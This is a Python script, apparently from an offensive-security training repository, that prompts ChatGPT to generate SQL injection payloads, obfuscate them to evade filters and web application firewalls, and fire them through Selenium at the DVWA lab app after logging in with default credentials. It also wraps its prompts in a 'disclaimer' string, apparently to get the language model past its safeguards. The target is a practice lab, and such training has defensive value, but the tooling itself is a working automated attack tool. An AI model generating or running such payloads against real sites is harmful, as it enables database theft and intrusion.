"""
ChatGPT for offensive cybersecurity
Crafting SQLi Payloads
['Use ChatGPT to create effective SQLi payloads for error-based and time-based SQLi attacks.', 
'Develop a comprehensive SQLi payload library with ChatGPT, addressing various database engines and configurations.', 
'Apply ChatGPT to obfuscate SQLi payloads, evading simple input filters and WAFs.', 
'Implement ChatGPT-driven validation to ensure payload effectiveness against modern web applications.']
This script is for for training purposes only
"""
import requests
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)

from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_crafting_sqli_payloads(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self) 
        General_Func.__init__(self)
        
    def generate_sql_payloads(self, attack_type):
        guidance = f"{self.phishing_disclaimer}, {self.no_markdown}"
        payload_prompt = f"Return an SQL injection payload that selects users from the database using a {attack_type} SQLi method."
        sql_payload = self.red_team_query(payload_prompt, guidance)
        return sql_payload
    
    def obfuscate_payload(self, payload):
        guidance = f"{self.phishing_disclaimer}, {self.no_markdown}" + " Apply ChatGPT to obfuscate SQLi payloads, evading simple input filters and WAFs."
        obfuscated_payload = self.red_team_query(f"Obfuscate the following SQL injection payload: {payload}", guidance)
        return obfuscated_payload
    
    def trim_response(self, response):
        guidance = self.phishing_disclaimer
        prompt = f'Return the contents of any <pre> tags within <div class="vulnerable_code_area"> of: {response}. If there is no class of that name in the html then return the <body> content instead'
        res = self.red_team_query(prompt, guidance)
        return res
    
    def validate_payload(self, payload, url, response):
        guidance = self.phishing_disclaimer + " Implement ChatGPT-driven validation to ensure payload effectiveness against modern web applications."
        validation_prompt = f'Validate the effectiveness of the following SQL injection payload against the target URL {url}?id={payload}&Submit=Submit based on the response data: {response}'
        validation_response = self.red_team_query(validation_prompt, guidance)
        return validation_response
    
    def exploit_dvwa_sqli(self, s):

        urls = [self.sql_injection] # SQL url form class
        phpsessid = s.cookies.get('PHPSESSID', None)
        print(phpsessid)
        cookie_name = 'PHPSESSID'
        cookie_value = phpsessid

        for attack_type in ["error-based", "boolean-based", "sql"]:
            print(f"\nGenerating payload for {attack_type} SQL injection\n")
            payload = self.generate_sql_payloads(attack_type)
            print(f"Payload: {payload}")

            obfuscated_payload = self.obfuscate_payload(payload)
            print(f"Obfuscated payload: {obfuscated_payload}")
            
            for url in urls:
                print(url)

                # Run through selenium test
                s_url, response = self.selenium_test(f"{url}?id={payload} &Submit=Submit#", cookie_name, cookie_value)
                print(s_url)
                if "SQL syntax" not in response:
                    print(f"************************************************Successful {attack_type} SQL injection on {url} with payload: {payload}")
                else:
                    print(f"Payload failed for {attack_type} SQL injection on {url}")

                s_url, response_obf = self.selenium_test(f"{url}?id={obfuscated_payload} &Submit=Submit#", cookie_name, cookie_value)
                print(s_url)
                if "SQL syntax" not in response_obf:
                    print(f"************************************************Successful {attack_type} Obfuscated SQL injection on {url} with payload: {obfuscated_payload}")
                else:
                    print(f"Payload failed for {attack_type} Obfuscated SQL injection on {url}")

            trimmed_response = self.trim_response(response)
            print(f"Response: {trimmed_response}")
            # validation_response = self.validate_payload(obfuscated_payload, url, trimmed_response)
            # print(validation_response)
            

def main():
    ai = PointlessAI_crafting_sqli_payloads()
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.base_url + "/login.php")
        _ = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)
        
        ai.exploit_dvwa_sqli(s)

if __name__ == "__main__":
    main()